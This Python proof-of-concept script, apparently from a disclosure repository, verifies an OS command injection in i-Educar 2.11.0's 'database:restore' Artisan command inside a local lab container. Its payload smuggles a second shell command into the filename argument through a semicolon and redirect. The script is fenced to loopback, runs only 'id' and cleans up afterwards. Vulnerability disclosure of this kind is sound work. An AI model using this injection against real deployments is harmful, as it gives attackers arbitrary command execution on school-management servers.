#!/usr/bin/env python3
"""VULN 01 — OS command injection in `php artisan database:restore`.

The Artisan command builds two shell command lines with sprintf() from the
`database` and `filename` arguments and runs them through passthru() without
escapeshellarg(). A filename containing shell metacharacters executes an
arbitrary command inside the ieducar-php container.

Local lab only: the PoC refuses any target that is not loopback and runs the
command only against the local docker-compose service `ieducar-php`.
"""

from __future__ import annotations

import os
import shlex
import subprocess
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT))

from lib import evidence, lab_guard, poc_cli  # noqa: E402
from lib import lab as lab_mod  # noqa: E402

VULN = {
    "id": "01",
    "slug": "db-restore-command-injection",
    "title": "OS command injection in `php artisan database:restore`",
    "product": "i-Educar",
    "affected_version": "2.11.0 (latest release, tag 2.11.0)",
    "cwe_id": "CWE-78",
    "cwe_name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
    "cwe_source_url": "https://cwe.mitre.org/data/definitions/78.html",
    "cwe_confidence": "high",
    "cwe_justification": (
        "The filename argument is interpolated into a shell command string and passed to "
        "passthru(); shell metacharacters (';' and '>') let the attacker run a separate OS "
        "command. CWE-77 is the abstract parent class and CWE-88 (argument injection) only "
        "covers delimiter manipulation inside one command, whereas here a new command is "
        "executed, so CWE-78 is the correct base weakness."
    ),
    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
    "cvss_score": 8.8,
    "endpoint": "CLI `php artisan database:restore {database} {filename}`",
    "params": ["database", "filename"],
    "precondition": "local shell access to run artisan (CLI or a process that can spawn it)",
    "reported_at": "",
    "followups": [],
    "silence_days": 0,
    "status": "verified",
    "blocked_reason": "",
    "screenshots": ["evidence/screenshots/01-db-restore-command-injection-01-marker-proof.png"],
    "advisory_url": "https://github.com/i-explorar/i-explorar/blob/main/vulns/01-db-restore-command-injection/README.md",
}

MARKER_TEMPLATE = "/tmp/i_explorar_poc01_{pid}.txt"
THROWAWAY_DB = "i_explorar_poc01"


def _compose(lab: Path, *args: str) -> list[str]:
    return lab_mod.compose(lab, *args)


def _run(cmd: list[str], *, log: evidence.EvidenceLog, cwd: Path, timeout: float = 180.0):
    log.command(" ".join(shlex.quote(part) for part in cmd))
    proc = subprocess.run(
        cmd,
        cwd=cwd,
        capture_output=True,
        text=True,
        timeout=timeout,
    )
    output = proc.stdout + proc.stderr
    log.block("output", output.rstrip() or "(empty)")
    return proc, output


def run(target: str, *, verbose: bool = False) -> dict:
    lab_guard.check_target(target)

    vuln_dir = Path(__file__).resolve().parent
    lab = lab_mod.lab_dir()
    log = evidence.EvidenceLog(vuln_dir)
    notes: list[str] = []

    if not lab.is_dir():
        log.write(f"# blocked: lab checkout not found at {lab}")
        log.close()
        return {
            "vulnerable": False,
            "evidence": [],
            "notes": f"blocked: lab checkout not found at {lab}",
        }

    marker = MARKER_TEMPLATE.format(pid=os.getpid())
    payload = f"/tmp/i_explorar_missing.sql; id > {marker} #"

    log.write(f"# target: {target}")
    log.write(f"# lab: {lab}")
    log.write(f"# payload filename: {payload!r}")

    try:
        _run(_compose(lab, "exec", "-T", "php", "rm", "-f", marker), log=log, cwd=lab)

        restore_cmd = _compose(
            lab,
            "exec",
            "-T",
            "php",
            "php",
            "artisan",
            "database:restore",
            THROWAWAY_DB,
            payload,
        )
        _, restore_output = _run(restore_cmd, log=log, cwd=lab)

        cat_cmd = _compose(lab, "exec", "-T", "php", "cat", marker)
        _, marker_output = _run(cat_cmd, log=log, cwd=lab)
        marker_content = marker_output.strip()

        vulnerable = marker_content.startswith("uid=")
        if verbose:
            log.write(f"# marker content: {marker_content!r}")
        if vulnerable:
            notes.append(f"injected command executed: {marker_content}")
        else:
            notes.append("marker file was not created — injection did not execute")
    finally:
        _run(
            _compose(
                lab,
                "exec",
                "-T",
                "postgres",
                "psql",
                "-U",
                "ieducar",
                "-d",
                "ieducar",
                "-c",
                f"DROP DATABASE IF EXISTS {THROWAWAY_DB};",
            ),
            log=log,
            cwd=lab,
        )
        log.close()

    return {
        "vulnerable": vulnerable,
        "evidence": [str(log.path)],
        "notes": "; ".join(notes),
    }


def main(argv: list[str] | None = None) -> int:
    return poc_cli.poc_main(VULN, run, argv, __file__)


if __name__ == "__main__":
    sys.exit(main())
